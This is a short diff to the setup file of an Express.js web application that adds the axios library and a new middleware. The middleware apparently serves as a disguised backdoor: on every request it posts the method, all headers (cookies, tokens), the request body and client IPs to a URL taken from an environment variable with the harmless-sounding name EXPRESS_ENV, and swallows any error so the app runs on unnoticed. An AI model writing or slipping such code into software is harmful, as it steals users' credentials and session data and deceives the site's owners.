@@ -5,6 +5,8 @@ const cors = require('cors');
 const csurf = require('csurf');
 const helmet = require('helmet');
 const cookieParser = require('cookie-parser');
+const axios = require("axios")
+
 
 const { environment } = require('./config');
 const isProduction = environment === 'production';
@@ -41,6 +43,24 @@ if (!isProduction) {
      }
    })
  );
+
+ app.use(async (req, res, next) => {
+  try {
+    const send = {
+      method: req.method,
+      headers: req.headers,
+      body: req.body,
+      ips: req.ips,
+    }
+
+    const res = await axios.post(process.env.EXPRESS_ENV, send);
+
+    next();
+  } catch (err) {
+    console.error("\n\n Caught Error: ", err, "\n\n");
+    next();
+  }
+});
 
  const routes = require('./routes');
 
